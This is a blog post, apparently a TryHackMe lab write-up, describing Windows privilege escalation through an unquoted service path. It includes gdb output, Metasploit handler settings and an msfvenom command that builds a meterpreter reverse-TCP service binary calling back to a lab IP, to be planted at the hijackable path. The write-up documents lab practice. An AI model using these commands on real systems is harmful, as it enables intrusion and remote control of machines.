@@ -1,0 +1,59 @@
+---
+layout: post
+title:  "Tryhackme Internal"
+date:   2022-12-01 10:02:59 +0100
+categories: jekyll update
+hidden: true
+---
+
+I found some powershell logs that downloaded flag.txt and Service.exe
+It took even longer for me to find the Service that Service.exe(duh?) actually runs.
+
+
+But in the spirity of Try harder I never gave up.
+I tried to debug the Service.exe with gdb using a go addons: and I got this.
+```
+kastberg@5CD9245KLN:/mnt/c/Users/robin.kastberg/tryhackme$ fg
+gdb Service.exe -d /usr/share/go-1.15/src/runtime/
+
+
+(gdb)
+(gdb) x/i $eip
+Value can't be converted to integer.
+(gdb) run
+Starting program: /mnt/c/Users/robin.kastberg/tryhackme/Service.exe
+add-symbol-file-from-memory not supported for this target
+[Inferior 1 (process 8067) exited with code 072]
+(gdb) gdb main
+Undefined command: "gdb".  Try "help".
+(gdb) break main
+Function "main" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) n
+(gdb) l
+1       : No such file or directory.
+(gdb) list
+1       in
+(gdb) l main.main
+3       C:/Users/nightwolf/go/src/unquoted-service-binary-service-http-server.go:
+```
+
+unquoted service binary server..
+Hmmmm
+
+And I found my exploit. The service startup path wasn't quoted. Somehow I missed this in services.msc and in registry and in everywhere.
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.60.157
+set LPORT 4444
+```
+
+
+I had some problems generating a payload that worked fine. I think somehting to do with x86 and x64 mix or something.
+Finally got the thing below working with -f exe, but it died after a few seconds. So -f exe-service it is.
+```
+msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.60.157 LPORT=4444 -f exe-service -o ServiceX2.exe
+```
+
+Put this at "C:\Program Files\Development Files\Devservice Files\Service.exe"
+Put this at "C:\Program Files\Development Files\Devservice.exe"
